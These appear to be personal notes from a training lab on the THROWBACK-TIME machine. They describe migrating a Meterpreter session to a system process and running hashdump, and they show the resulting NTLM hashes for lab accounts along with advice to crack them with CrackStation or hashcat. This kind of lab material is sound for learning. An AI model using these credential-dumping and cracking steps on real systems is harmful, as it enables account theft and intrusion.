- Now that we have a meterpreter session running on THROWBACK-TIME, we can utilize meterpreter's built-in tools and techniques to extract hashes and then get a ssh shell to explore the SQL database!

## Extending Meterpreter
- Meterpreter is a useful shell that allows us to execute shell commands as well as use some additional functionality within meterpreter. 
- The command we will be focusing on is the 'hashdump' command, similar to mimikatz it can allow us to dump NTLM hashes on the system. Meterpreter can also act as a C2 server with modules like incognito and powershell which we will cover later in this course.

![[Pasted image 20221020165948.png]]


## Migrating to a different process overview
- If you are not in a system process, then hashdump wont really work.
- So we need to do the following to migrate to a different process


1. Use `ps` utility to list out all the processes running on the system

2. Use `migrate <PID>` to migrate to another process running on the system.

3. Now use `hashdump` to dump hashes on the THROWBACK-TIME machine

Hashdump
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43d73c6a52e8626eabc5eb77148dca0b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
sshd:1008:aad3b435b51404eeaad3b435b51404ee:6eea75cd2cc4ddf2967d5ee05792f9fb:::
Timekeeper:1009:aad3b435b51404eeaad3b435b51404ee:901682b1433fdf0b04ef42b13e343486:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::
```


# Disclamer - Crack hashes from crackstation.exe but only include the hash from the third colo (:) 
- Else we can use hashcat too for the same process

